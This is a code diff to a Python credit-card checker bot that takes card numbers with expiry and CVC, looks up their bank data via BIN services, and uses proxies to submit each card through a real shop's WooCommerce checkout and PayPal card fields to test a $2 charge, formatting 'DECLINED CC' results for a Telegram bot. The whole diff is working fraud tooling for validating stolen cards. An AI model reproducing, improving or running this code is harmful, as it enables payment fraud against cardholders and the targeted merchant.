@@ -42,9 +42,9 @@ def get_random_proxy():
         print(f"Error reading proxy file: {str(e)}")
         return None
 
-# BIN lookup function - UPDATED with only binlist.net API
+# BIN lookup function - UPDATED with multiple reliable APIs
 def get_bin_info(bin_number):
-    """Get BIN information using reliable binlist.net API"""
+    """Get BIN information using multiple reliable APIs with fallback"""
     if not bin_number or len(bin_number) < 6:
         return {
             'bank': 'Unavailable',
@@ -57,57 +57,83 @@ def get_bin_info(bin_number):
     
     bin_code = bin_number[:6]
     
-    try:
-        # Use only binlist.net API that works well
-        api_url = f"https://lookup.binlist.net/{bin_code}"
-        
-        headers = {
-            'Accept': 'application/json',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        }
-        
-        response = requests.get(api_url, headers=headers, timeout=10, verify=False)
-        
-        if response.status_code == 200:
-            data = response.json()
+    # Try multiple APIs in sequence
+    apis_to_try = [
+        f"https://lookup.binlist.net/{bin_code}",
+        f"https://bin-ip-checker.p.rapidapi.com/?bin={bin_code}",
+        f"https://bins.antipublic.cc/bins/{bin_code}",
+    ]
+    
+    headers = {
+        'Accept': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    }
+    
+    for api_url in apis_to_try:
+        try:
+            print(f"Trying BIN API: {api_url}")
+            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
             
-            # Parse binlist.net response format
-            bin_info = {
-                'bank': data.get('bank', {}).get('name', 'Unavailable'),
-                'country': data.get('country', {}).get('name', 'Unknown'),
-                'brand': data.get('scheme', 'Unknown'),
-                'type': data.get('type', 'Unknown'),
-                'level': data.get('brand', 'Unknown'),  # binlist doesn't have level field
-                'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
-            }
-            
-            # Clean up the values
-            for key in ['bank', 'country', 'brand', 'type', 'level']:
-                if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None']:
-                    bin_info[key] = 'Unknown'
-            
-            return bin_info
-        else:
-            print(f"BIN API failed with status: {response.status_code}")
-            return {
-                'bank': 'Unavailable',
-                'country': 'Unknown',
-                'brand': 'Unknown',
-                'type': 'Unknown',
-                'level': 'Unknown',
-                'emoji': '🏳️'
-            }
-        
-    except Exception as e:
-        print(f"BIN lookup error: {str(e)}")
-        return {
-            'bank': 'Unavailable',
-            'country': 'Unknown',
-            'brand': 'Unknown',
-            'type': 'Unknown',
-            'level': 'Unknown',
-            'emoji': '🏳️'
-        }
+            if response.status_code == 200:
+                data = response.json()
+                bin_info = {}
+                
+                # Parse based on API response format
+                if 'binlist.net' in api_url:
+                    # binlist.net format
+                    bin_info = {
+                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
+                        'country': data.get('country', {}).get('name', 'Unknown'),
+                        'brand': data.get('scheme', 'Unknown'),
+                        'type': data.get('type', 'Unknown'),
+                        'level': data.get('brand', 'Unknown'),
+                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
+                    }
+                elif 'antipublic.cc' in api_url:
+                    # antipublic.cc format
+                    bin_info = {
+                        'bank': data.get('bank', 'Unavailable'),
+                        'country': data.get('country', 'Unknown'),
+                        'brand': data.get('vendor', 'Unknown'),
+                        'type': data.get('type', 'Unknown'),
+                        'level': data.get('level', 'Unknown'),
+                        'emoji': get_country_emoji(data.get('country_code', ''))
+                    }
+                else:
+                    # Generic format
+                    bin_info = {
+                        'bank': data.get('bank', {}).get('name', data.get('bank_name', 'Unavailable')),
+                        'country': data.get('country', {}).get('name', data.get('country_name', 'Unknown')),
+                        'brand': data.get('scheme', data.get('brand', 'Unknown')),
+                        'type': data.get('type', data.get('card_type', 'Unknown')),
+                        'level': data.get('level', data.get('card_level', 'Unknown')),
+                        'emoji': get_country_emoji(data.get('country', {}).get('code', data.get('country_code', '')))
+                    }
+                
+                # Clean up the values
+                for key in ['bank', 'country', 'brand', 'type', 'level']:
+                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
+                        bin_info[key] = 'Unknown'
+                
+                # If we got valid data, return it
+                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
+                    print(f"BIN info successfully retrieved from {api_url}")
+                    return bin_info
+                    
+        except Exception as e:
+            print(f"BIN API {api_url} failed: {str(e)}")
+            continue
+    
+    # If all APIs failed, return default values
+    print("All BIN APIs failed, using default values")
+    return {
+        'bank': 'Unavailable',
+        'country': 'Unknown',
+        'brand': 'Unknown',
+        'type': 'Unknown',
+        'level': 'Unknown',
+        'emoji': '🏳️'
+    }
 
 def get_country_emoji(country_code):
     """Convert country code to emoji"""
@@ -227,6 +253,11 @@ def check_card_paypal(cc_line):
 
         n, mm, yy, cvc = parts
 
+        # FIRST: Get BIN information before anything else
+        print("Getting BIN information...")
+        bin_info = get_bin_info(n[:6])
+        print(f"BIN Info retrieved: {bin_info}")
+
         # Format month and year
         if len(mm) == 1:
             mm = f'0{mm}'
@@ -275,7 +306,21 @@ def check_card_paypal(cc_line):
             response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, proxies=proxy, verify=False)
             response.raise_for_status()
         except requests.RequestException as e:
-            return f"❌ Error in add-to-cart request: {str(e)}"
+            elapsed_time = time.time() - start_time
+            return f"""
+DECLINED CC ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Add to cart failed: {str(e)}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
 
         # Second request: Checkout
         headers = {
@@ -298,7 +343,21 @@ def check_card_paypal(cc_line):
             response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers, proxies=proxy, verify=False)
             response.raise_for_status()
         except requests.RequestException as e:
-            return f"❌ Error in checkout request: {str(e)}"
+            elapsed_time = time.time() - start_time
+            return f"""
+DECLINED CC ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Checkout failed: {str(e)}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
 
         # Extract security tokens
         try:
@@ -307,7 +366,21 @@ def check_card_paypal(cc_line):
             check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
             create = re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1)
         except AttributeError:
-            return "❌ Failed to extract security tokens"
+            elapsed_time = time.time() - start_time
+            return f"""
+DECLINED CC ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to extract security tokens
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
 
         # Update order review
         headers = {
@@ -333,7 +406,21 @@ def check_card_paypal(cc_line):
             response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data, proxies=proxy, verify=False)
             response.raise_for_status()
         except requests.RequestException as e:
-            return f"❌ Error in update order review: {str(e)}"
+            elapsed_time = time.time() - start_time
+            return f"""
+DECLINED CC ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Update order review failed: {str(e)}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
 
         # Create order
         headers = {
@@ -374,7 +461,21 @@ def check_card_paypal(cc_line):
             order_id = response.json()['data']['id']
             pcp = response.json()['data']['custom_id']
         except (requests.RequestException, KeyError, ValueError) as e:
-            return f"❌ Failed to extract order ID: {str(e)}"
+            elapsed_time = time.time() - start_time
+            return f"""
+DECLINED CC ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to extract order ID: {str(e)}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
 
         # Generate random session IDs
         lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
@@ -417,7 +518,21 @@ def check_card_paypal(cc_line):
             response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, proxies=proxy, verify=False)
             response.raise_for_status()
         except requests.RequestException as e:
-            return f"❌ Error in PayPal card fields request: {str(e)}"
+            elapsed_time = time.time() - start_time
+            return f"""
+DECLINED CC ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ PayPal card fields failed: {str(e)}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
 
         # Final payment request
         random_code = generate_random_code()
@@ -472,11 +587,24 @@ def check_card_paypal(cc_line):
             response.raise_for_status()
             last = response.text
         except requests.RequestException as e:
-            return f"❌ Error in final payment request: {str(e)}"
+            elapsed_time = time.time() - start_time
+            return f"""
+DECLINED CC ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Final payment failed: {str(e)}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
 
         # Process response and format result
         elapsed_time = time.time() - start_time
-        bin_info = get_bin_info(n[:6]) or {}
         
         # Determine status based on response
         result_text = ""
@@ -529,7 +657,22 @@ def check_card_paypal(cc_line):
 
     except Exception as e:
         elapsed_time = time.time() - start_time
-        return f"❌ Error: {str(e)} (Time: {elapsed_time:.2f}s)"
+        # Get BIN info even for errors to ensure we have it
+        bin_info = get_bin_info(cc_line.split('|')[0][:6]) if '|' in cc_line else get_bin_info('')
+        return f"""
+ERROR ❌
+
+💳𝗖𝗖 ⇾ {cc_line}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request failed: {str(e)}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
 
 # For standalone testing
 if __name__ == "__main__":
